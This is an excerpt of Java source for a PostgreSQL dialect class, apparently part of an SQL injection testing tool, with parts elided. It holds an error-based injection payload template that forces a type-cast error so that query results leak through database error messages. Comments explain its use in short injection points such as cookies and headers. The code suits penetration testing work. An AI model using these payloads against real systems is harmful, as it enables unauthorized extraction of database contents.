...
public class PostgresDialect implements DbmsDialect {
    ...
    public List<String> errorFunctions() {
        ...
        return List.of(
                ...
                // Level 1: Compact CAST without markers — for character-limited injection points
                // (cookies, headers, truncating queries). Much shorter payload (~50 chars vs ~160).
                // Data extracted via STATIC_EXTRACTION_PATTERNS:
                //   "invalid input syntax for type integer: \"~DATA\""
                // CHR(126) ('~') prefix FORCES the CAST to always error — even when (%s) returns
                // a pure numeric value like COUNT(*). Without it, CAST(42 AS int) would succeed
                // silently, producing no error and no extraction. The leading '~' is stripped
                // after extraction.
                "1=CAST(CHR(126)||(%s)::text AS int)"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        // Both marker and compact CAST are available at all levels
    ...
    public String errorTestQuery() {
        // Explicit non-null guarantee — current_database() is never null on PostgreSQL,
        // but COALESCE adds safety for edge cases (e.g., connecting without a default DB).
        return "SELECT COALESCE(CAST(current_database() AS TEXT),CHR(49))";
    }
